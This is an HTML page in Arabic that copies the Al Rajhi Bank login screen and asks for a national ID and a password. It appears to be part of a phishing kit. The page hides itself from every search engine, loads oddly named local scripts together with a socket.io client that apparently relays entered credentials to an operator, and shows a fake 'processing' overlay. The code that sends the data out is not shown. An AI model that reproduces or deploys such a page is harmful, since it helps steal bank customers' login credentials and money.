<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta name="yandex" content="none" />
    <title>Rajhi</title>

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" />
    
    <link href="https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <link rel="stylesheet" href="css/style7.css">

</head>

<body>
    <div class="container">
        <img class="logo" src="assets/photos/Al_Rajhi_Bank_Logo.svg.png" alt="Al Rajhi" />
        <div class="title">
            <div class="hi">مرحباً بك</div>
            <div class="lead">بالتجربة الرقمية الأفضل</div>
        </div>

        <form id="loginForm" novalidate>
            <div class="field">
                <input style='font-family:"Almarai",system-ui,-apple-system,Segoe UI,Roboto,Arial' type="text" id="uid"
                    name="user_name" inputmode="numeric" autocomplete="off" maxlength="10"
                    placeholder="أدخل الهوية الوطنية أو الإقامة" required
                    oninput="this.value=this.value.replace(/\D/g,'').slice(0,10);" />
            </div>

            <small id="nidErr" class="sf-hidden"></small>

            <div class="field">
                <input style='font-family:"Almarai",system-ui,-apple-system,Segoe UI,Roboto,Arial' type="password"
                    id="pwd" name="bk_pass" placeholder="ادخل كلمة المرور" required />
            </div>

            <div class="box-link">
                <div>
                    <div style="font-weight:700">هل لديك حساب في الراجحي؟</div>
                    <div class="sub">سجّل في القناة الرقمية هنا</div>
                </div>
                <div style="font-size:18px;color:#666">‹</div>
            </div>

            <div class="row">
                <a href="#">نسيت كلمة المرور؟</a>
                <label class="remember">
                    <input type="checkbox" checked value="on" /> تذكرني
                </label>
            </div>

            <button type="submit" id="loginBtn" class="btn-login" disabled>تسجيل الدخول</button>
            <button type="button" class="btn-fast">فعل خدمة الدخول السريع</button>
            <a class="open-acc" href="#">افتح حساب</a>

            <small id="formMsg" class="text-danger d-none"></small>
        </form>
    </div>

    
    <div id="loadingOverlay">
        <div class="text-center text-white">
            <div class="spinner-border text-light mb-3" role="status"></div>
            <h5 class="font-weight-bold">يرجى الانتظار</h5>
            <p>انتظر حتى تتم معالجة طلبك</p>
        </div>
    </div>

   
    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>   
    <script src="js/rajh1.js"></script>
    <script src="js/rajh2.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="js/kn5k.js"></script>
</body>

</html>
